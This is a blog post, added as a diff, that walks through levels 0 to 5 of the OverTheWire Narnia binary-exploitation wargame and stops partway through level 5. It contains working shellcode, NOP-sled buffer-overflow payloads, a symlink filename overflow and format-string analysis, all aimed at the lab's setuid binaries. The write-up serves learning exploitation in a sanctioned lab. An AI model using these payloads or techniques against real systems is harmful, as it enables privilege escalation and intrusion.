@@ -1,0 +1,966 @@
+---
+layout: post
+title:  "OverTheWire: Narnia"
+date:   2021-02-16 12:57:56 +0200
+categories: overthewire
+---
+Today we solve a series of challenges offered to us by ```OverTheWire``` that would introduce us to the basics of binary exploitation, ```Narnia```!
+From the website:
+```Description:
+This wargame is for the ones that want to learn basic exploitation. You can see the most
+common bugs in this game and we've tried to make them easy to exploit. You'll get the
+source code of each level to make it easier for you to spot the vuln and abuse it. The
+difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
+levels could be quite tricky.
+
+Narnia’s levels are called narnia0, narnia1, … etc. and can be accessed on narnia.labs.overthewire.org through SSH on port 2226.
+```
+
+## Level 0 -> 1 ##
+```
+narnia0@narnia:~$ cd /narnia/
+narnia0@narnia:/narnia$ ls
+narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
+narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c 
+narnia0@narnia:/narnia$ cat narnia0.c
+```
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+    }
+    else {
+        printf("WAY OFF!!!!\n");
+        exit(1);
+    }
+
+    return 0;
+}
+```
+
+This is an obvious buffer overflow. We are asked to change ```val```'s value into ```0xdeadbeef``` and since it's a ```long``` it has exactly 4 bytes. The ```scanf("%24s",&buf);``` reads exactly a 24 character string into ```char buf[20];```, a 20 byte character array. Clearly, we can overwrite past that buffer into the previously declared variable, ```val```.
+```
+narnia0@narnia:/narnia$ python -c 'print "a" * 20 + "\xef\xbe\xad\xde"' | ./narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
+val: 0xdeadbeef
+```
+This worked! Now let's just append ```stdin``` so that we can actually obtain the shell:
+```
+narnia0@narnia:/narnia$ python -c 'print "a" * 20 + "\xef\xbe\xad\xde"' > /tmp/exploit0
+narnia0@narnia:/narnia$ cat /tmp/exploit0 - | ./narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+```
+
+## Level 1 -> 2 ##
+Alright, let's see what we have here:
+```
+narnia1@narnia:~$ cd /narnia
+narnia1@narnia:/narnia$ cat narnia1.c 
+```
+```
+#include <stdio.h>
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+```
+Looks like it declared the function pointer ```int (*ret)();``` and stores in the memory pointed by it the value of an environment variable called ```EGG``` and executes it afterwards. This means that if we were to give it shellcode, it would point the flow the execution (```eip``` pointer to it). First, let's figure out the architecture:
+```
+narnia1@narnia:/narnia$ file narnia1
+narnia1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=328875c03e74c86e5dddfe88094a577f308ab167, not stripped
+```
+Alright, so we need to build a 32-bit shellcode. Let's get started:
+```
+bits 32
+    xor esi, esi
+    push esi ; add null terminator for the pushed string
+    ; building up the string on the stack
+    push   0x68732f2f ; hs//
+    push   0x6e69622f ; nib/
+    mov ebx, esp
+    mov ecx, esi
+    mov edx, esi
+    xor eax, eax
+    mov al, 0xb ; execve("/bin//sh", 0, 0)
+    int 0x80 ; tap into kernel mode
+```
+Go ahead and paste it inside a file we will assemble using ```nasm```:
+```
+narnia1@narnia:/narnia$ vim /tmp/shellcode1.S
+narnia1@narnia:/narnia$ nasm -f elf32 /tmp/shellcode1.S -o /tmp/shellcode1.o
+narnia1@narnia:/narnia$ ld -m elf_i386 -o /tmp/shellcode1 /tmp/shellcode1.o
+ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
+```
+Don't worry about that warning, it just tells us we should've used the label ```_start``` at the very beginning. Let's execute the shellcode and see if we get a shell!
+```
+narnia1@narnia:/narnia$ /tmp/shellcode1
+$ ls
+narnia0    narnia1.c  narnia3	 narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4	 narnia5.c  narnia7    narnia8.c
+$ whoami
+narnia1
+$ exit
+```
+SUCCESS!!
+Let's get out shellcode bytes:
+```
+narnia1@narnia:/narnia$ objdump -rd /tmp/shellcode1 -M intel
+
+/tmp/shellcode1:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <__bss_start-0x1019>:
+ 8048060:	31 f6                	xor    esi,esi
+ 8048062:	56                   	push   esi
+ 8048063:	68 2f 2f 73 68       	push   0x68732f2f
+ 8048068:	68 2f 62 69 6e       	push   0x6e69622f
+ 804806d:	89 e3                	mov    ebx,esp
+ 804806f:	89 f1                	mov    ecx,esi
+ 8048071:	89 f2                	mov    edx,esi
+ 8048073:	31 c0                	xor    eax,eax
+ 8048075:	b0 0b                	mov    al,0xb
+ 8048077:	cd 80                	int    0x80
+```
+So, our shellcode will be:
+```char shellcode[] = "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80"```
+
+Alright! Now let's get that into our environment variable and pop the shell!
+```
+narnia1@narnia:/narnia$ export EGG=$(echo -en "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80")
+narnia1@narnia:/narnia$ echo $EGG
+1�Vh//shh/bin����1��
+
+narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+```
+
+## Level 2 -> 3
+Let's meet our next challenge!
+```
+narnia2@narnia:~$ cd /narnia
+narnia2@narnia:/narnia$ cat narnia2.c
+```
+```
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char * argv[]){
+    char buf[128];
+
+    if(argc == 1){
+        printf("Usage: %s argument\n", argv[0]);
+        exit(1);
+    }
+    strcpy(buf,argv[1]);
+    printf("%s", buf);
+
+    return 0;
+}
+```
+Let's check the protections
+```
+narnia2@narnia:/narnia$ checksec narnia2
+[*] '/narnia/narnia2'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+From what we can see, we can inject and execute shellcode again, since ```NX``` is disabled. Let's find the offset where the ```ret``` instruction pops off the stack. We will use a ```pwndbg```'s ```De Brujin```'s cycle to easily do this:
+```
+pwndbg> cyclic 200
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/vultur/.cache/.pwntools-cache-3.8/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.2.2 --> 4.3.1).
+    Update with: $ pip install -U pwntools
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+```
+Now let's throw it at our binary
+```
+narnia2@narnia:/narnia$ gdb ./narnia2
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./narnia2...(no debugging symbols found)...done.
+(gdb) set args aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+(gdb) r
+Starting program: /narnia/narnia2 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616169 in ?? ()
+```
+Aaaaand let's get our offset
+```
+pwndbg> cyclic -l 0x62616169
+132
+```
+Brilliant! By dumping a portion of our current stack frame we can get an estimative address where to put our shellcode:
+```
+(gdb) x/200bx $esp-100
+0xffffd4bc:	0x6a	0x61	0x61	0x61	0x6b	0x61	0x61	0x61
+0xffffd4c4:	0x6c	0x61	0x61	0x61	0x6d	0x61	0x61	0x61
+0xffffd4cc:	0x6e	0x61	0x61	0x61	0x6f	0x61	0x61	0x61
+0xffffd4d4:	0x70	0x61	0x61	0x61	0x71	0x61	0x61	0x61
+0xffffd4dc:	0x72	0x61	0x61	0x61	0x73	0x61	0x61	0x61
+0xffffd4e4:	0x74	0x61	0x61	0x61	0x75	0x61	0x61	0x61
+0xffffd4ec:	0x76	0x61	0x61	0x61	0x77	0x61	0x61	0x61
+0xffffd4f4:	0x78	0x61	0x61	0x61	0x79	0x61	0x61	0x61
+0xffffd4fc:	0x7a	0x61	0x61	0x62	0x62	0x61	0x61	0x62
+0xffffd504:	0x63	0x61	0x61	0x62	0x64	0x61	0x61	0x62
+0xffffd50c:	0x65	0x61	0x61	0x62	0x66	0x61	0x61	0x62
+0xffffd514:	0x67	0x61	0x61	0x62	0x68	0x61	0x61	0x62
+0xffffd51c:	0x69	0x61	0x61	0x62	0x6a	0x61	0x61	0x62
+0xffffd524:	0x6b	0x61	0x61	0x62	0x6c	0x61	0x61	0x62
+0xffffd52c:	0x6d	0x61	0x61	0x62	0x6e	0x61	0x61	0x62
+0xffffd534:	0x6f	0x61	0x61	0x62	0x70	0x61	0x61	0x62
+0xffffd53c:	0x71	0x61	0x61	0x62	0x72	0x61	0x61	0x62
+0xffffd544:	0x73	0x61	0x61	0x62	0x74	0x61	0x61	0x62
+0xffffd54c:	0x75	0x61	0x61	0x62	0x76	0x61	0x61	0x62
+0xffffd554:	0x77	0x61	0x61	0x62	0x78	0x61	0x61	0x62
+0xffffd55c:	0x79	0x61	0x61	0x62	0x00	0x00	0x00	0x00
+0xffffd564:	0x00	0x00	0x00	0x00	0x02	0x00	0x00	0x00
+0xffffd56c:	0x50	0x83	0x04	0x08	0x00	0x00	0x00	0x00
+0xffffd574:	0x10	0xe7	0xfe	0xf7	0x99	0xa1	0xe2	0xf7
+0xffffd57c:	0x00	0xd0	0xff	0xf7	0x02	0x00	0x00	0x00
+(gdb) p $ebp
+$3 = (void *) 0x62616168
+```
+Right, so it seems our ebp is at 0xffffd518 and our crash point is situated at address 0xffffd51c of the stack. Our shellcode has 25 bytes, so let's try and build the following payload:
+```107 * nops + shellcode + stack_address``` and let's choose our stack address ```0xffffd7c0``` and see how it goes.
+
+```
+(gdb) r $(python -c 'print "\x90" * 107 + "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80" + "\xc0\xd7\xff\xff"')
+$ whoami
+narnia2
+```
+Bingo we've got our shell! Now to get the flag:
+```
+arnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "\x90" * 107 + "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80" + "\xc0\xd7\xff\xff"')
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+```
+
+## Level 3 -> 4 ##
+Let's see what our binary does this time:
+```
+narnia3@narnia:~$ cd /narnia
+narnia3@narnia:/narnia$ ./narnia3
+usage, ./narnia3 file, will send contents of file 2 /dev/null
+```
+Hmm, interesting, so the output will be thrown to ```/dev/null```. Let's investigate the source code:
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv){
+
+    int  ifd,  ofd;
+    char ofile[16] = "/dev/null";
+    char ifile[32];
+    char buf[32];
+
+    if(argc != 2){
+        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
+        exit(-1);
+    }
+
+    /* open files */
+    strcpy(ifile, argv[1]);
+    if((ofd = open(ofile,O_RDWR)) < 0 ){
+        printf("error opening %s\n", ofile);
+        exit(-1);
+    }
+    if((ifd = open(ifile, O_RDONLY)) < 0 ){
+        printf("error opening %s\n", ifile);
+        exit(-1);
+    }
+
+    /* copy from file1 to file2 */
+    read(ifd, buf, sizeof(buf)-1);
+    write(ofd,buf, sizeof(buf)-1);
+    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+
+    /* close 'em */
+    close(ifd);
+    close(ofd);
+
+    exit(1);
+}
+```
+Alright so we can overflow the ```ofile``` buffer with the name of a file we are allowed to read. We just need to create a file with a name big enough to overflow the buffer, that is a symbolic link to our desired password file. But since we are not allowed to have ```/``` in Linux for obvious reasons, we will need to create an additional directory.
+```
+narnia3@narnia:/narnia$ python -c 'print "a" * 28'
+aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+narnia3@narnia:/narnia$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/
+narnia3@narnia:/narnia$ ln -sf /etc/narnia_pass/narnia4 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/flag
+narnia3@narnia:/narnia$ ./narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/flag
+copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/flag to a safer place... (/tmp/flag)
+narnia3@narnia:/narnia$ cat /tmp/flag
+```
+And there's our flag!
+
+## Level 4 -> 5 ##
+Let us see what narnia is up to this time
+```
+narnia4@narnia:~$ cd /narnia/
+narnia4@narnia:/narnia$ cat narnia4
+narnia4    narnia4.c  
+narnia4@narnia:/narnia$ cat narnia4.c 
+```
+```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+    int i;
+    char buffer[256];
+
+    for(i = 0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+
+    if(argc>1)
+        strcpy(buffer,argv[1]);
+
+    return 0;
+}
+```
+Looking at the ```ltrace``` it would seem that the binary tries to null out an external array of strings containing the names of environment variables:
+```
+narnia4@narnia:/narnia$ ltrace ./narnia4 
+__libc_start_main(0x80484ab, 1, 0xffffd6a4, 0x8048530 <unfinished ...>
+strlen("LC_ALL=en_US.UTF-8")                                            = 18
+memset(0xffffd7f6, '\0', 18)                                            = 0xffffd7f6
+strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                           = 1467
+memset(0xffffd809, '\0', 1467)                                          = 0xffffd809
+strlen("LC_MEASUREMENT=ro_RO.UTF-8")                                    = 26
+memset(0xffffddc5, '\0', 26)                                            = 0xffffddc5
+strlen("SSH_CONNECTION=82.79.100.14 3931"...)                           = 51
+memset(0xffffdde0, '\0', 51)                                            = 0xffffdde0
+strlen("LC_PAPER=ro_RO.UTF-8")                                          = 20
+memset(0xffffde14, '\0', 20)                                            = 0xffffde14
+strlen("LC_MONETARY=ro_RO.UTF-8")                                       = 23
+memset(0xffffde29, '\0', 23)                                            = 0xffffde29
+strlen("LANG=en_US.UTF-8")                                              = 16
+memset(0xffffde41, '\0', 16)                                            = 0xffffde41
+strlen("LC_NAME=ro_RO.UTF-8")                                           = 19
+memset(0xffffde52, '\0', 19)                                            = 0xffffde52
+strlen("USER=narnia4")                                                  = 12
+memset(0xffffde66, '\0', 12)                                            = 0xffffde66
+strlen("PWD=/narnia")                                                   = 11
+memset(0xffffde73, '\0', 11)                                            = 0xffffde73
+strlen("HOME=/home/narnia4")                                            = 18
+memset(0xffffde7f, '\0', 18)                                            = 0xffffde7f
+strlen("SSH_CLIENT=82.79.100.14 39318 22"...)                           = 32
+memset(0xffffde92, '\0', 32)                                            = 0xffffde92
+strlen("LC_ADDRESS=ro_RO.UTF-8")                                        = 22
+memset(0xffffdeb3, '\0', 22)                                            = 0xffffdeb3
+strlen("LC_NUMERIC=ro_RO.UTF-8")                                        = 22
+memset(0xffffdeca, '\0', 22)                                            = 0xffffdeca
+strlen("SSH_TTY=/dev/pts/2")                                            = 18
+memset(0xffffdee1, '\0', 18)                                            = 0xffffdee1
+strlen("MAIL=/var/mail/narnia4")                                        = 22
+memset(0xffffdef4, '\0', 22)                                            = 0xffffdef4
+strlen("TERM=xterm-256color")                                           = 19
+memset(0xffffdf0b, '\0', 19)                                            = 0xffffdf0b
+strlen("SHELL=/bin/bash")                                               = 15
+memset(0xffffdf1f, '\0', 15)                                            = 0xffffdf1f
+strlen("TMOUT=1800")                                                    = 10
+memset(0xffffdf2f, '\0', 10)                                            = 0xffffdf2f
+strlen("SHLVL=1")                                                       = 7
+memset(0xffffdf3a, '\0', 7)                                             = 0xffffdf3a
+strlen("LC_TELEPHONE=ro_RO.UTF-8")                                      = 24
+memset(0xffffdf42, '\0', 24)                                            = 0xffffdf42
+strlen("LOGNAME=narnia4")                                               = 15
+memset(0xffffdf5b, '\0', 15)                                            = 0xffffdf5b
+strlen("PATH=/usr/local/bin:/usr/bin:/bi"...)                           = 61
+memset(0xffffdf6b, '\0', 61)                                            = 0xffffdf6b
+strlen("LC_IDENTIFICATION=ro_RO.UTF-8")                                 = 29
+memset(0xffffdfa9, '\0', 29)                                            = 0xffffdfa9
+strlen("OLDPWD=/home/narnia4")                                          = 20
+memset(0xffffdfc7, '\0', 20)                                            = 0xffffdfc7
+strlen("_=/usr/bin/ltrace")                                             = 17
+memset(0xffffdfdc, '\0', 17)                                            = 0xffffdfdc
++++ exited (status 0) +++
+```
+It would seem that because of that ```strcpy``` that is carelessly used we can also overflow the stack frame. Let's find the offset for the return address:
+```
+narnia4@narnia:/narnia$ gdb ./narnia4
+(gdb) source /usr/local/gef/gef.py 
+gef➤  patt create 300
+[+] Generating a pattern of 300 bytes
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+[+] Saved as '$_gef0'
+gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+Starting program: /narnia/narnia4 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+
+Program received signal SIGSEGV, Segmentation fault.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x0       
+$ecx   : 0xffffd7d0  →  "cwaacxaacyaac"
+$edx   : 0xffffd4d3  →  "cwaacxaacyaac"
+$esp   : 0xffffd4c0  →  "raacsaactaacuaacvaacwaacxaacyaac"
+$ebp   : 0x63616170 ("paac"?)
+$esi   : 0x2       
+$edi   : 0xf7fc5000  →  0x001b2db0
+$eip   : 0x63616171 ("qaac"?)
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd4c0│+0x0000: "raacsaactaacuaacvaacwaacxaacyaac"	 ← $esp
+0xffffd4c4│+0x0004: "saactaacuaacvaacwaacxaacyaac"
+0xffffd4c8│+0x0008: "taacuaacvaacwaacxaacyaac"
+0xffffd4cc│+0x000c: "uaacvaacwaacxaacyaac"
+0xffffd4d0│+0x0010: "vaacwaacxaacyaac"
+0xffffd4d4│+0x0014: "waacxaacyaac"
+0xffffd4d8│+0x0018: "xaacyaac"
+0xffffd4dc│+0x001c: "yaac"
+───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x63616171
+───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "narnia4", stopped, reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x63616171 in ?? ()
+gef➤  patt off 0x63616171
+[+] Searching '0x63616171'
+[+] Found at offset 264 (little-endian search) likely
+```
+And let's check the enabled mitigations:
+```
+gef➤  checksec
+[+] checksec for '/narnia/narnia4'
+Canary                        : No
+NX                            : No
+PIE                           : No
+Fortify                       : No
+RelRO                         : No
+```
+So, since we don't have canaryies, it makes sense for the offset to be at 264 (```buffer``` has 256 bytes, ```i``` has 4 bytes and the saved ```ebp``` has 4 bytes). Since ```NX``` is disabled we can also inject and execute our previous shellcode, let's look at the stack frame dump to estimate a possible entry point that we will follow with nops
+```
+gef➤  x/264bx $esp-264
+0xffffd3b8:	0x62	0x61	0x61	0x61	0x63	0x61	0x61	0x61
+0xffffd3c0:	0x64	0x61	0x61	0x61	0x65	0x61	0x61	0x61
+0xffffd3c8:	0x66	0x61	0x61	0x61	0x67	0x61	0x61	0x61
+0xffffd3d0:	0x68	0x61	0x61	0x61	0x69	0x61	0x61	0x61
+0xffffd3d8:	0x6a	0x61	0x61	0x61	0x6b	0x61	0x61	0x61
+0xffffd3e0:	0x6c	0x61	0x61	0x61	0x6d	0x61	0x61	0x61
+0xffffd3e8:	0x6e	0x61	0x61	0x61	0x6f	0x61	0x61	0x61
+0xffffd3f0:	0x70	0x61	0x61	0x61	0x71	0x61	0x61	0x61
+0xffffd3f8:	0x72	0x61	0x61	0x61	0x73	0x61	0x61	0x61
+0xffffd400:	0x74	0x61	0x61	0x61	0x75	0x61	0x61	0x61
+0xffffd408:	0x76	0x61	0x61	0x61	0x77	0x61	0x61	0x61
+0xffffd410:	0x78	0x61	0x61	0x61	0x79	0x61	0x61	0x61
+0xffffd418:	0x7a	0x61	0x61	0x62	0x62	0x61	0x61	0x62
+0xffffd420:	0x63	0x61	0x61	0x62	0x64	0x61	0x61	0x62
+0xffffd428:	0x65	0x61	0x61	0x62	0x66	0x61	0x61	0x62
+0xffffd430:	0x67	0x61	0x61	0x62	0x68	0x61	0x61	0x62
+0xffffd438:	0x69	0x61	0x61	0x62	0x6a	0x61	0x61	0x62
+0xffffd440:	0x6b	0x61	0x61	0x62	0x6c	0x61	0x61	0x62
+0xffffd448:	0x6d	0x61	0x61	0x62	0x6e	0x61	0x61	0x62
+0xffffd450:	0x6f	0x61	0x61	0x62	0x70	0x61	0x61	0x62
+0xffffd458:	0x71	0x61	0x61	0x62	0x72	0x61	0x61	0x62
+0xffffd460:	0x73	0x61	0x61	0x62	0x74	0x61	0x61	0x62
+0xffffd468:	0x75	0x61	0x61	0x62	0x76	0x61	0x61	0x62
+0xffffd470:	0x77	0x61	0x61	0x62	0x78	0x61	0x61	0x62
+0xffffd478:	0x79	0x61	0x61	0x62	0x7a	0x61	0x61	0x63
+0xffffd480:	0x62	0x61	0x61	0x63	0x63	0x61	0x61	0x63
+0xffffd488:	0x64	0x61	0x61	0x63	0x65	0x61	0x61	0x63
+0xffffd490:	0x66	0x61	0x61	0x63	0x67	0x61	0x61	0x63
+0xffffd498:	0x68	0x61	0x61	0x63	0x69	0x61	0x61	0x63
+0xffffd4a0:	0x6a	0x61	0x61	0x63	0x6b	0x61	0x61	0x63
+0xffffd4a8:	0x6c	0x61	0x61	0x63	0x6d	0x61	0x61	0x63
+0xffffd4b0:	0x6e	0x61	0x61	0x63	0x6f	0x61	0x61	0x63
+0xffffd4b8:	0x70	0x61	0x61	0x63	0x71	0x61	0x61	0x63
+```
+Alright so we can see our crash happens when the ```eip``` reaches address ```0xffffd4bc``` from the stack. Our shellcode has 25 bytes so let's choose an estimate address where to force the execution to... say ```0xffffd400``` looks decent. Alright, now let's try out a payload!
+```
+narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print (230) * "\x90" + "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80" + 9 * "\x90" + "\xac\xd4\xff\xff"')
+$ whoami
+narnia5
+$ cat /etc/narnia_pass/narnia5
+```
+
+## Level 5 -> 6 ##
+```
+narnia5@narnia:~$ cd /narnia/
+narnia5@narnia:/narnia$ ./narnia5 
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [] (0)
+i = 1 (0xffffd610)
+narnia5@narnia:/narnia$ cat narnia5.c 
+```
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv){
+	int i = 1;
+	char buffer[64];
+
+	snprintf(buffer, sizeof buffer, argv[1]);
+	buffer[sizeof (buffer) - 1] = 0;
+	printf("Change i's value from 1 -> 500. ");
+
+	if(i==500){
+		printf("GOOD\n");
+        setreuid(geteuid(),geteuid());
+		system("/bin/sh");
+	}
+
+	printf("No way...let me give you a hint!\n");
+	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+	printf ("i = %d (%p)\n", i, &i);
+	return 0;
+}
+```
+This looks like a potential format string vulnerability...
+```
+narnia5@narnia:/narnia$ ./narnia5 %s
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [�-narnia5@narnia:/narnia$
+```
+Yep, format vulnerability it is. We just screwed up th output through a simple format string. This vulnerability is best understood through example. Let's use gdb for this. I am going to put a breakpoint before ```snprintf``` is called and we will go throught what happens in memory.
+```
+gef➤  b *0x08048528
+Breakpoint 1 at 0x8048528
+gef➤  r AAAA%08x
+```
+Let's also note our ```ebp``` right before the call:
+```
+gef➤  p $ebp
+$1 = (void *) 0xffffd5d8
+```
+Alright, but first, what are the parameters passed to ```snprintf```? I will write comments next to the instructions
+```
+   0x08048519 <+14>:	mov    eax,DWORD PTR [ebp+0xc] ; eax = argv
+   0x0804851c <+17>:	add    eax,0x4 ; eax = argv + 1
+   0x0804851f <+20>:	mov    eax,DWORD PTR [eax] ; eax = *(argv + 1)
+   0x08048521 <+22>:	push   eax ; argv[1]
+   0x08048522 <+23>:	push   0x40 ; sizeof buffer (64)
+   0x08048524 <+25>:	lea    eax,[ebp-0x48] ; 0xffffd590 (address of buffer)
+   0x08048527 <+28>:	push   eax ; address of buffer
+   0x08048528 <+29>:	call   0x80483f0 <snprintf@plt>
+```
+Now, let's look at the stack frame dump before the call:
+```
+gef➤  x/90bx $esp
+                    address of buffer                  sizeof buffer
+0xffffd584:    (0x90	0xd5	0xff	0xff)  (0x40	0x00	0x00	0x00)
+                        argv[1]                     contents of buffer
+0xffffd58c:    (0xd5	0xd7	0xff	0xff)  [0x00	0x50	0xfc	0xf7
+0xffffd594:	0x74	0xd6	0xff	0xff	0x00	0xcd	0xff	0xf7
+0xffffd59c:	0x00	0x00	0x20	0x00	0x01	0x00	0x00	0x00
+0xffffd5a4:	0x00	0x00	0x00	0x00	0x90	0x08	0xe4	0xf7
+0xffffd5ac:	0x1b	0x86	0x04	0x08	0x02	0x00	0x00	0x00
+0xffffd5b4:	0x74	0xd6	0xff	0xff	0x80	0xd6	0xff	0xff
+0xffffd5bc:	0xf1	0x85	0x04	0x08	0xdc	0x53	0xfc	0xf7
+0xffffd5c4:	0x2c	0x82	0x04	0x08	0xd9	0x85	0x04	0x08
+                                                            i = 1
+0xffffd5cc:	0x00	0x00	0x00	0x00]  (0x01	0x00	0x00	0x00)
